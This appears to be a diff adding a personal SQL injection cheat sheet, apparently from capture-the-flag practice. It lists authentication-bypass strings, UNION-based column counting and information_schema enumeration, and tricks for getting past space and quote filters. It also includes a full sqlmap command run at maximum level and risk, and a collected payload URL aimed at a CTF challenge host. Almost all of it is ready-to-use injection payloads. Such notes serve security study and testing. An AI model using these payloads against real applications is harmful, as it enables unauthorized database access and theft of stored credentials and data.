@@ -1,0 +1,71 @@
+= SQL injection
+
+== Basic tips
+
+use
+
+    ' OR 1
+
+instead of
+
+    ' OR 1=1 --
+
+Because the query can stay semantically correct. Use in both user and pass
+fields. Via Unikoder
+
+Union-based tips
+
+* add colums until query passes
+
+  union select 1 -- fail
+  union select 1,2 -- fail
+  union select 1,2,3 -- fail
+  union select 1,2,3,4 -- success!
+
+* get information out of it
+
+  union select username,2,3,4 -- fail
+  union select 1,username,3,4 -- success!
+  ...
+
+Information schema grinding tips
+
+* leverage group_concat (COALESCE in postgresql)
+  * databases
+
+    union select 1,group_concat(TABLE_SCHEMA),3,4 FROM information_schema.tables (GROUP BY ...)
+
+  * tables
+  
+    union select 1,group_concat(TABLE_NAME),3,4 FROM information_schema.tables (GROUP BY ...)
+
+== Restrictions bypass
+
+=== No spaces allowed
+
+Use comments: '/**/OR/**/'admin'/**/OR/**/'
+
+=== Single quotes stripped
+
+Use \ to prevent quote from closing and hope to control later
+
+== sqlmap
+
+python sqlmap.py -v 5 --time-sec=15 --dbms=PostgreSQL -u "http://192.168.103.1:4574/?t=1" -p t --not-string="try to submit illegal characters" --level=5 --risk=3
+
+--tamper=TAMPER     Use given script(s) for tampering injection data
+
+with http://forkbombers.blogspot.ca/2013/05/sqlmaps-tamper-scripts.html
+
+
+== SQLi collection
+
+----
+ip=\
+id= OR 1 > 2 UNION SELECT group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.columns WHere TABLE_NAME LIke CHar(102,108,97,103);#
+http://blacklist.adctf2014.katsudon.org/search?ip=\&id=%20or%201%3E2%20UNION%20SELECT%20group_concat(COLUMN_NAME)%20FROM%20INFORMATION_SCHEMA.columns%20WHere%20TABLE_NAME%20LIke%20CHar(102,%20108,%2097,%20103);%23
+----
+
+== OWASP Track
+
+    notexists') UNION SELECT 'yolo' # 
